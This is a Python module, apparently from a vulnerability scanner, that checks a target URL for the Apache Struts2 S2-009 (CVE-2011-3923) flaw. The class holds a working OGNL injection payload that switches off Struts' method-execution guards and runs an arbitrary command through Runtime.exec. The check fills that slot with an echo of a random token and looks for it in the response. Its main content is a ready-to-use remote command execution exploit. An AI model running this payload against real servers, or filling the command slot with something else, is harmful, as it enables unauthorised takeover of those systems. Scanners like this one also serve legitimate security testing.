#!/usr/bin/env python3

import urllib
from app.lib.utils.request import request
from app.lib.utils.encode import base64encode
from app.lib.utils.common import get_capta,filter_str

class S2_009_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-009漏洞,又名CVE-2011-3923漏洞',
            'description': 'Struts2 S2-009漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.1',
            'date': '2012-01-20',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/ajax/example5.action'
        self.capta = get_capta() 
        self.payload =  '?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            check_url = self.url + self.payload.format(cmd = urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8'))
            check_res = request.get(check_url)
            check_str = filter_str(list(check_res.text))
            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_009 = S2_009_BaseVerify('http://127.0.0.1:8080')
    S2_009.run()